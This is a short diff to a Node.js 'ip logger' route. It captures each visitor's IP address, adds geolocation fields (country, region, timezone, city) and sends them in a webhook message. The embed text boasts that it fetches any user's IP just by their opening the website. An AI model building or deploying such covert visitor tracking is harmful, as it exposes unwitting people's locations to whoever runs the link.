@@ -8,7 +8,7 @@ let date = d.toDateString();
 
 router.get("/", (req, res) => {
     const ip = req.headers["x-forwarded-for"]
-    const geo = geoip.lookup(ip)
+    const geo = geoip.lookup(ip) || { country: null, region: null, timezone: null, city: null };
     const embed = new MessageBuilder()
       .setTitle("NodeJS ip logger")
       .setAuthor(
@@ -18,7 +18,10 @@ router.get("/", (req, res) => {
       )
       .setURL("https://www.google.com")
       .addField("IP address", `${ip}`, true)
-      .addField("Timestamp", date)
+      .addField("country", geo.country)
+      .addField("region", geo.region)
+      .addField("timezone", geo.timezone)
+      .addField("city", geo.city)
       .setColor(7785669)
       .setDescription(
         "Fetch the ip address of any user, just by opening the website."
